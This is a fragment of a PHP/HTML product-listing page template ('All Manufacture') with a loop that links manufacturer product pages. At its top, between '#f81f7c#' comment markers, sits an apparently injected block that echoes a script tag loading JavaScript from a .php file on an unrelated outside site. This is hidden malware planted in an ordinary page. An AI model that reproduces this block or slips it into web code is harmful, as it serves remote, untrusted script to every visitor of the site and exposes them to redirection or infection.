...
#f81f7c#
if(empty($srwv)) {
$srwv = "<script type=\"text/javascript\" src=\"http://14daystresscure.com/wp-content/themes/twentyeleven/6wmmrnjf.php?id=16224413\"></script>";
echo $srwv;
}
#/f81f7c#
?>
	...
	<td valign="top" colspan="2" style="background-color: #FFFFFF; border:2px solid #cccccc; ">
		...
		<b><!-- InstanceBeginEditable name="header" -->All Manufacture<!-- InstanceEndEditable --></b>
		...
		<!-- InstanceBeginEditable name="content" -->
			...
			?>
				...
				<img src="../images/bullet_3.gif" align="absmiddle" /> &nbsp; <a href="manufacture_product.php?id=<?=$val["id"] ?>"><?=$val["name"] ?></a>
				</div>				
			<? } } ?>
			<br /><br />
		<!-- InstanceEndEditable -->	
